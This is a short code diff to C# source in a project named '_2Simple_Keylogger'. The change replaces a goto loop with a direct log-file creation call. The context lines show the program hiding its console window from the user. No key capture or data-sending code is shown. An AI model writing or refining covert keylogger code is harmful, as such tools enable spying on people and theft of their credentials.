@@ -35,7 +35,6 @@ namespace _2Simple_Keylogger
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
 
-        ExLoop:
             if (!Directory.Exists(path))
             {
                 Directory.CreateDirectory(path);
@@ -48,7 +47,7 @@ namespace _2Simple_Keylogger
 
             if (!File.Exists(fPath))
             {
-                goto ExLoop;
+                File.Create(fPath);
             }
             else
             {
